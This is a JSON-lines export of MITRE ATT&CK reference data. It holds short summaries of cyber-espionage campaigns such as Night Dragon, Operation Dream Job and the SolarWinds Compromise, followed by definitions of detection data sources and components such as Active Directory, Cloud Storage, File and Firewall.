{"ID":"C0004","name":"CostaRicto","description":"[CostaRicto](https://attack.mitre.org/campaigns/C0004) was a suspected hacker-for-hire cyber espionage campaign that targeted multiple industries worldwide, with a large number being financial institutions. [CostaRicto](https://attack.mitre.org/campaigns/C0004) actors targeted organizations in Europe, the Americas, Asia, Australia, and Africa, with a large concentration in South Asia (especially India, Bangladesh, and Singapore), using custom malware, open source tools, and a complex network of proxies and SSH tunnels.(Citation: BlackBerry CostaRicto November 2020)","url":"https://attack.mitre.org/campaigns/C0004","created":"15 September 2022","last modified":"05 October 2022","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: BlackBerry CostaRicto November 2020),(Citation: BlackBerry CostaRicto November 2020),"}
{"ID":"C0001","name":"Frankenstein","description":"[Frankenstein](https://attack.mitre.org/campaigns/C0001) was described by security researchers as a highly-targeted campaign conducted by moderately sophisticated and highly resourceful threat actors in early 2019. The unidentified actors primarily relied on open source tools, including [Empire](https://attack.mitre.org/software/S0363). The campaign name refers to the actors' ability to piece together several unrelated open-source tool components.(Citation: Talos Frankenstein June 2019)","url":"https://attack.mitre.org/campaigns/C0001","created":"07 September 2022","last modified":"22 March 2023","version":"1.1","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: Talos Frankenstein June 2019),(Citation: Talos Frankenstein June 2019),"}
{"ID":"C0007","name":"FunnyDream","description":"[FunnyDream](https://attack.mitre.org/campaigns/C0007) was a suspected Chinese cyber espionage campaign that targeted government and foreign organizations in Malaysia, the Philippines, Taiwan, Vietnam, and other parts of Southeast Asia. Security researchers linked the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign to possible Chinese-speaking threat actors through the use of the [Chinoxy](https://attack.mitre.org/software/S1041) backdoor and noted infrastructure overlap with the TAG-16 threat group.(Citation: Bitdefender FunnyDream Campaign November 2020)(Citation: Kaspersky APT Trends Q1 2020)(Citation: Recorded Future Chinese Activity in Southeast Asia December 2021)","url":"https://attack.mitre.org/campaigns/C0007","created":"20 September 2022","last modified":"10 October 2022","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),"}
{"ID":"C0002","name":"Night Dragon","description":"[Night Dragon](https://attack.mitre.org/campaigns/C0002) was a cyber espionage campaign that targeted oil, energy, and petrochemical companies, along with individuals and executives in Kazakhstan, Taiwan, Greece, and the United States. The unidentified threat actors searched for information related to oil and gas field production systems, financials, and collected data from SCADA systems. Based on the observed techniques, tools, and network activities, security researchers assessed the campaign involved a threat group based in China.(Citation: McAfee Night Dragon)","url":"https://attack.mitre.org/campaigns/C0002","created":"08 September 2022","last modified":"22 September 2022","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: McAfee Night Dragon),(Citation: McAfee Night Dragon),"}
{"ID":"C0012","name":"Operation CuckooBees","description":"[Operation CuckooBees](https://attack.mitre.org/campaigns/C0012) was a cyber espionage campaign targeting technology and manufacturing companies in East Asia, Western Europe, and North America since at least 2019. Security researchers noted the goal of [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), which was still ongoing as of May 2022, was likely the theft of proprietary information, research and development documents, source code, and blueprints for various technologies. Researchers assessed [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012) was conducted by actors affiliated with [Winnti Group](https://attack.mitre.org/groups/G0044), [APT41](https://attack.mitre.org/groups/G0096), and BARIUM.(Citation: Cybereason OperationCuckooBees May 2022)","url":"https://attack.mitre.org/campaigns/C0012","created":"22 September 2022","last modified":"22 March 2023","version":"1.1","associated campaigns":null,"associated campaigns citations":null,"contributors":"Andrea Serrano Urea, Telefónica Tech","relationship citations":"(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Cybereason OperationCuckooBees May 2022),"}
{"ID":"C0022","name":"Operation Dream Job","description":"[Operation Dream Job](https://attack.mitre.org/campaigns/C0022) was a cyber espionage operation likely conducted by [Lazarus Group](https://attack.mitre.org/groups/G0032) that targeted the defense, aerospace, government, and other sectors in the United States, Israel, Australia, Russia, and India. In at least one case, the cyber actors tried to monetize their network access to conduct a business email compromise (BEC) operation. In 2020, security researchers noted overlapping TTPs, to include fake job lures and code similarities, between [Operation Dream Job](https://attack.mitre.org/campaigns/C0022), Operation North Star, and Operation Interception; by 2022 security researchers described [Operation Dream Job](https://attack.mitre.org/campaigns/C0022) as an umbrella term covering both Operation Interception and Operation North Star.(Citation: ClearSky Lazarus Aug 2020)(Citation: McAfee Lazarus Jul 2020)(Citation: ESET Lazarus Jun 2020)(Citation: The Hacker News Lazarus Aug 2022)","url":"https://attack.mitre.org/campaigns/C0022","created":"17 March 2023","last modified":"10 April 2023","version":"1.0","associated campaigns":"Operation Interception, Operation North Star","associated campaigns citations":"(Citation: ESET Lazarus Jun 2020), (Citation: McAfee Lazarus Jul 2020)(Citation: McAfee Lazarus Nov 2020)","contributors":null,"relationship citations":"(Citation: McAfee Lazarus Jul 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: McAfee Lazarus Jul 2020),(Citation: ESET Lazarus Jun 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: McAfee Lazarus Jul 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: ESET Lazarus Jun 2020)"}
{"ID":"C0016","name":"Operation Dust Storm","description":"[Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) was a long-standing persistent cyber espionage campaign that targeted multiple industries in Japan, South Korea, the United States, Europe, and several Southeast Asian countries. By 2015, the [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) threat actors shifted from government and defense-related intelligence targets to Japanese companies or Japanese subdivisions of larger foreign organizations supporting Japan's critical infrastructure, including electricity generation, oil and natural gas, finance, transportation, and construction.(Citation: Cylance Dust Storm)\n\n[Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) threat actors also began to use Android backdoors in their operations by 2015, with all identified victims at the time residing in Japan or South Korea.(Citation: Cylance Dust Storm)","url":"https://attack.mitre.org/campaigns/C0016","created":"29 September 2022","last modified":"30 September 2022","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: Cylance Dust Storm),(Citation: Cylance Dust Storm),"}
{"ID":"C0023","name":"Operation Ghost","description":"[Operation Ghost](https://attack.mitre.org/campaigns/C0023) was an [APT29](https://attack.mitre.org/groups/G0016) campaign starting in 2013 that included operations against ministries of foreign affairs in Europe and the Washington, D.C. embassy of a European Union country. During [Operation Ghost](https://attack.mitre.org/campaigns/C0023), [APT29](https://attack.mitre.org/groups/G0016) used new families of malware and leveraged web services, steganography, and unique C2 infrastructure for each victim.(Citation: ESET Dukes October 2019)\n","url":"https://attack.mitre.org/campaigns/C0023","created":"23 March 2023","last modified":"06 April 2023","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: ESET Dukes October 2019),(Citation: ESET Dukes October 2019),(Citation: ESET Dukes October 2019)"}
{"ID":"C0006","name":"Operation Honeybee","description":"[Operation Honeybee](https://attack.mitre.org/campaigns/C0006) was a campaign that targeted humanitarian aid and inter-Korean affairs organizations from at least late 2017 through early 2018. [Operation Honeybee](https://attack.mitre.org/campaigns/C0006) initially targeted South Korea, but expanded to include Vietnam, Singapore, Japan, Indonesia, Argentina, and Canada. Security researchers assessed the threat actors were likely Korean speakers based on metadata used in both lure documents and executables, and named the campaign \"Honeybee\" after the author name discovered in malicious Word documents.(Citation: McAfee Honeybee) ","url":"https://attack.mitre.org/campaigns/C0006","created":"16 September 2022","last modified":"13 October 2022","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: McAfee Honeybee),(Citation: McAfee Honeybee),"}
{"ID":"C0013","name":"Operation Sharpshooter","description":"[Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013) was a global cyber espionage campaign that targeted nuclear, defense, government, energy, and financial companies, with many located in Germany, Turkey, the United Kingdom, and the United States. Security researchers noted the campaign shared many similarities with previous [Lazarus Group](https://attack.mitre.org/groups/G0032) operations, including fake job recruitment lures and shared malware code.(Citation: McAfee Sharpshooter December 2018)(Citation: Bleeping Computer Op Sharpshooter March 2019)(Citation: Threatpost New Op Sharpshooter Data March 2019)    ","url":"https://attack.mitre.org/campaigns/C0013","created":"26 September 2022","last modified":"13 October 2022","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: McAfee Sharpshooter December 2018),(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: Threatpost New Op Sharpshooter Data March 2019),(Citation: McAfee Sharpshooter December 2018),"}
{"ID":"C0005","name":"Operation Spalax","description":"[Operation Spalax](https://attack.mitre.org/campaigns/C0005) was a campaign that primarily targeted Colombian government organizations and private companies, particularly those associated with the energy and metallurgical industries. The [Operation Spalax](https://attack.mitre.org/campaigns/C0005) threat actors distributed commodity malware and tools using generic phishing topics related to COVID-19, banking, and law enforcement action. Security researchers noted indicators of compromise and some infrastructure overlaps with other campaigns dating back to April 2018, including at least one separately attributed to [APT-C-36](https://attack.mitre.org/groups/G0099), however identified enough differences to report this as separate, unattributed activity.(Citation: ESET Operation Spalax Jan 2021)  ","url":"https://attack.mitre.org/campaigns/C0005","created":"16 September 2022","last modified":"13 October 2022","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: ESET Operation Spalax Jan 2021),(Citation: ESET Operation Spalax Jan 2021),"}
{"ID":"C0014","name":"Operation Wocao","description":"[Operation Wocao](https://attack.mitre.org/campaigns/C0014) was a cyber espionage campaign that targeted organizations around the world, including in Brazil, China, France, Germany, Italy, Mexico, Portugal, Spain, the United Kingdom, and the United States. The suspected China-based actors compromised government organizations and managed service providers, as well as aviation, construction, energy, finance, health care, insurance, offshore engineering, software development, and transportation companies.(Citation: FoxIT Wocao December 2019)\n\nSecurity researchers assessed the [Operation Wocao](https://attack.mitre.org/campaigns/C0014) actors used similar TTPs and tools as APT20, suggesting a possible overlap. [Operation Wocao](https://attack.mitre.org/campaigns/C0014) was named after an observed command line entry by one of the threat actors, possibly out of frustration from losing webshell access.(Citation: FoxIT Wocao December 2019)","url":"https://attack.mitre.org/campaigns/C0014","created":"27 September 2022","last modified":"22 March 2023","version":"1.1","associated campaigns":null,"associated campaigns citations":null,"contributors":"Erik Schamper, @Schamperr, Fox-IT; Maarten van Dantzig, @MaartenVDantzig, Fox-IT","relationship citations":"(Citation: FoxIT Wocao December 2019),(Citation: FoxIT Wocao December 2019),"}
{"ID":"C0024","name":"SolarWinds Compromise","description":"The [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024) was a sophisticated supply chain cyber operation conducted by [APT29](https://attack.mitre.org/groups/G0016) that was discovered in mid-December 2020. [APT29](https://attack.mitre.org/groups/G0016) used customized malware to inject malicious code into the SolarWinds Orion software build process that was later distributed through a normal software update; they also used password spraying, token theft, API abuse, spear phishing, and other supply chain attacks to compromise user accounts and leverage their associated access. Victims of this campaign included government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East. Industry reporting initially referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, Dark Halo, and SolarStorm.(Citation: SolarWinds Advisory Dec 2020)(Citation: SolarWinds Sunburst Sunspot Update January 2021)(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Volexity SolarWinds)(Citation: CrowdStrike StellarParticle January 2022)(Citation: Unit 42 SolarStorm December 2020)(Citation: Microsoft Analyzing Solorigate Dec 2020)(Citation: Microsoft Internal Solorigate Investigation Blog) \n\nIn April 2021, the US and UK governments attributed the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024) to Russia's Foreign Intelligence Service (SVR); public statements included citations to [APT29](https://attack.mitre.org/groups/G0016), Cozy Bear, and The Dukes.(Citation: NSA Joint Advisory SVR SolarWinds April 2021)(Citation: UK NSCS Russia SolarWinds April 2021)(Citation: Mandiant UNC2452 APT29 April 2022) The US government assessed that of the approximately 18,000 affected public and private sector customers of Solar Winds’ Orion product, a much smaller number were compromised by follow-on [APT29](https://attack.mitre.org/groups/G0016) activity on their systems.(Citation: USG Joint Statement SolarWinds January 2021) ","url":"https://attack.mitre.org/campaigns/C0024","created":"24 March 2023","last modified":"14 April 2023","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: CheckPoint Sunburst & Teardrop December 2020),(Citation: Symantec Sunburst Sending Data January 2021),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Microsoft 365 Defender Solorigate),(Citation: Symantec RAINDROP January 2021),(Citation: SolarWinds Sunburst Sunspot Update January 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Microsoft Internal Solorigate Investigation Blog),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Volexity SolarWinds),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: MSTIC Nobelium Oct 2021),(Citation: Microsoft 365 Defender Solorigate),(Citation: Secureworks IRON RITUAL Profile),(Citation: SolarWinds Sunburst Sunspot Update January 2021),(Citation: Symantec RAINDROP January 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Mandiant UNC2452 APT29 April 2022),(Citation: UK NSCS Russia SolarWinds April 2021),(Citation: NSA Joint Advisory SVR SolarWinds April 2021)"}
{"name":"Active Directory","ID":"DS0026","description":"A database and set of services that allows administrators to manage permissions, access to network resources, and stored data objects (user, group, application, or devices)(Citation: Microsoft AD DS Getting Started)","collection layers":"Cloud Control Plane, Host","platforms":"Azure AD, Windows","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0026","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Active Directory: Active Directory Credential Request","ID":null,"description":"A user requested active directory credentials, such as a ticket or token (ex: Windows EID 4769)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Active Directory: Active Directory Object Access","ID":null,"description":"Opening of an active directory object, typically to collect/read its value (ex: Windows EID 4661)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Active Directory: Active Directory Object Creation","ID":null,"description":"Initial construction of a new active directory object (ex: Windows EID 5137)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Active Directory: Active Directory Object Deletion","ID":null,"description":"Removal of an active directory object (ex: Windows EID 5141)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Active Directory: Active Directory Object Modification","ID":null,"description":"Changes made to an active directory object (ex: Windows EID 5163 or 5136)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Application Log","ID":"DS0015","description":"Events collected by third-party services such as mail servers, web applications, or other appliances (not by the native OS or platform)(Citation: Confluence Logs)","collection layers":"Cloud Control Plane, Host","platforms":"Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0015","contributors":null}
{"name":"Application Log: Application Log Content","ID":null,"description":"Logging, messaging, and other artifacts provided by third-party services (ex: metrics, errors, and/or alerts from mail/web applications)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Certificate","ID":"DS0037","description":"A digital document, which highlights information such as the owner's identity, used to instill trust in public keys used while encrypting network communications","collection layers":"OSINT","platforms":"PRE","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0037","contributors":null}
{"name":"Certificate: Certificate Registration","ID":null,"description":"Queried or logged information highlighting current and expired digital certificates (ex: Certificate transparency)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Cloud Service","ID":"DS0025","description":"Infrastructure, platforms, or software that are hosted on-premise or by third-party providers, made available to users through network connections and/or APIs(Citation: Amazon AWS)(Citation: Azure Products)","collection layers":"Cloud Control Plane","platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0025","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Cloud Service: Cloud Service Disable","ID":null,"description":"Deactivation or stoppage of a cloud service (ex: AWS Cloudtrail StopLogging)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Cloud Service: Cloud Service Enumeration","ID":null,"description":"An extracted list of cloud services (ex: AWS ECS ListServices)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Cloud Service: Cloud Service Metadata","ID":null,"description":"Contextual data about a cloud service and activity around it such as name, type, or purpose/function","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Cloud Service: Cloud Service Modification","ID":null,"description":"Changes made to a cloud service, including its settings and/or data (ex: AWS CloudTrail DeleteTrail or DeleteConfigRule)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Cloud Storage","ID":"DS0010","description":"Data object storage infrastructure hosted on-premise or by third-party providers, made available to users through network connections and/or APIs(Citation: Amazon S3)(Citation: Azure Blob Storage)(Citation: Google Cloud Storage)","collection layers":"Cloud Control Plane","platforms":"IaaS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0010","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Cloud Storage: Cloud Storage Access","ID":null,"description":"Opening of a cloud storage infrastructure, typically to collect/read its value (ex: AWS S3 GetObject)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Cloud Storage: Cloud Storage Creation","ID":null,"description":"Initial construction of new cloud storage infrastructure (ex: AWS S3 CreateBucket)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Cloud Storage: Cloud Storage Deletion","ID":null,"description":"Removal of cloud storage infrastructure (ex: AWS S3 DeleteBucket)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Cloud Storage: Cloud Storage Enumeration","ID":null,"description":"An extracted list of cloud storage infrastructure (ex: AWS S3 ListBuckets or ListObjects)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Cloud Storage: Cloud Storage Metadata","ID":null,"description":"Contextual data about cloud storage infrastructure and activity around it such as name, size, or owner","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Cloud Storage: Cloud Storage Modification","ID":null,"description":"Changes made to cloud storage infrastructure, including its settings and/or data (ex: AWS S3 PutObject or PutObjectAcl)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Command","ID":"DS0017","description":"A directive given to a computer program, acting as an interpreter of some kind, in order to perform a specific task(Citation: Confluence Linux Command  Line)(Citation: Audit OSX)","collection layers":"Container, Host","platforms":"Android, Containers, Linux, Network, Windows, iOS, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.1","url":"https://attack.mitre.org/datasources/DS0017","contributors":"Austin Clark, @c2defense; Center for Threat-Informed Defense (CTID)"}
{"name":"Command: Command Execution","ID":null,"description":"The execution of a line of text, potentially with arguments, created from program code (e.g. a cmdlet executed via powershell.exe, interactive commands like >dir, shell executions, etc. )","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.1","url":null,"contributors":null}
{"name":"Container","ID":"DS0032","description":"A standard unit of virtualized software that packages up code and all its dependencies so the application runs quickly and reliably from one computing environment to another(Citation: Docker Docs Container)","collection layers":"Container","platforms":"Containers","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0032","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Container: Container Creation","ID":null,"description":"Initial construction of a new container (ex: docker create <container_name>)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Container: Container Enumeration","ID":null,"description":"An extracted list of containers (ex: docker ps)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Container: Container Start","ID":null,"description":"Activation or invocation of a container (ex: docker start or docker restart)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Domain Name","ID":"DS0038","description":"Information obtained (commonly through registration or activity logs) regarding one or more IP addresses registered with human readable names (ex: mitre.org)","collection layers":"OSINT","platforms":"PRE","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0038","contributors":null}
{"name":"Domain Name: Active DNS","ID":null,"description":"Queried domain name system (DNS) registry data highlighting current domain to IP address resolutions (ex: dig/nslookup queries)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Domain Name: Domain Registration","ID":null,"description":"Information about domain name assignments and other domain metadata (ex: WHOIS)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Domain Name: Passive DNS","ID":null,"description":"Logged domain name system (DNS) data highlighting timelines of domain to IP address resolutions (ex: passive DNS)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Drive","ID":"DS0016","description":"A non-volatile data storage device (hard drive, floppy disk, USB flash drive) with at least one formatted partition, typically mounted to the file system and/or assigned a drive letter(Citation: Sysmon EID 9)","collection layers":"Host","platforms":"Linux, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0016","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Drive: Drive Access","ID":null,"description":"Opening of a data storage device with an assigned drive letter or mount point","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Drive: Drive Creation","ID":null,"description":"Initial construction of a drive letter or mount point to a data storage device","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Drive: Drive Modification","ID":null,"description":"Changes made to a drive letter or mount point of a data storage device","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Driver","ID":"DS0027","description":"A computer program that operates or controls a particular type of device that is attached to a computer. Provides a software interface to hardware devices, enabling operating systems and other computer programs to access hardware functions without needing to know precise details about the hardware being used(Citation: IOKit Fundamentals)(Citation: Windows Getting Started Drivers)","collection layers":"Host","platforms":"Linux, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0027","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Driver: Driver Load","ID":null,"description":"Attaching a driver to either user or kernel-mode of a system (ex: Sysmon EID 6)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Driver: Driver Metadata","ID":null,"description":"Contextual data about a driver and activity around it such as driver issues reporting or integrity (page hash, code) checking","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"File","ID":"DS0022","description":"A computer resource object, managed by the I/O system, for storing data (such as images, text, videos, computer programs, or any wide variety of other media).(Citation: Microsoft File Mgmt)","collection layers":"Host","platforms":"Linux, Network, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0022","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"File: File Access","ID":null,"description":"Opening a file, which makes the file contents available to the requestor (ex: Windows EID 4663)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"File: File Creation","ID":null,"description":"Initial construction of a new file (ex: Sysmon EID 11)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"File: File Deletion","ID":null,"description":"Removal of a file (ex: Sysmon EID 23, macOS ESF EID ES_EVENT_TYPE_AUTH_UNLINK, or Linux commands auditd unlink, rename, rmdir, unlinked, or renameat rules)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"File: File Metadata","ID":null,"description":"Contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/ower, permissions, etc.","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"File: File Modification","ID":null,"description":"Changes made to a file, or its access permissions and attributes, typically to alter the contents of the targeted file (ex: Windows EID 4670 or Sysmon EID 2)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Firewall","ID":"DS0018","description":"A network security system, running locally on an endpoint or remotely as a service (ex: cloud environment), that monitors and controls incoming/outgoing network traffic based on predefined rules(Citation: AWS Sec Groups VPC)","collection layers":"Cloud Control Plane, Host","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0018","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Firewall: Firewall Disable","ID":null,"description":"Deactivation or stoppage of a cloud service (ex: Write/Delete entries within Azure Firewall Activity Logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Firewall: Firewall Enumeration","ID":null,"description":"An extracted list of available firewalls and/or their associated settings/rules (ex: Azure Network Firewall CLI Show commands)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Firewall: Firewall Metadata","ID":null,"description":"Contextual data about a firewall and activity around it such as name, policy, or status","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Firewall: Firewall Rule Modification","ID":null,"description":"Changes made to a firewall rule, typically to allow/block specific network traffic (ex: Windows EID 4950 or Write/Delete entries within Azure Firewall Rule Collection Activity Logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Firmware","ID":"DS0001","description":"Computer software that provides low-level control for the hardware and device(s) of a host, such as BIOS or UEFI/EFI","collection layers":"Host","platforms":"Linux, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0001","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Firmware: Firmware Modification","ID":null,"description":"Changes made to firmware, including its settings and/or data, such as MBR (Master Boot Record) and VBR (Volume Boot Record)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Group","ID":"DS0036","description":"A collection of multiple user accounts that share the same access rights to the computer and/or network resources and have common security rights(Citation: Amazon IAM Groups)","collection layers":"Cloud Control Plane, Host","platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS, Windows","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0036","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Group: Group Enumeration","ID":null,"description":"An extracted list of available groups and/or their associated settings (ex: AWS list-groups)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Group: Group Metadata","ID":null,"description":"Contextual data about a group which describes group and activity around it, such as name, permissions, or user accounts within the group","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
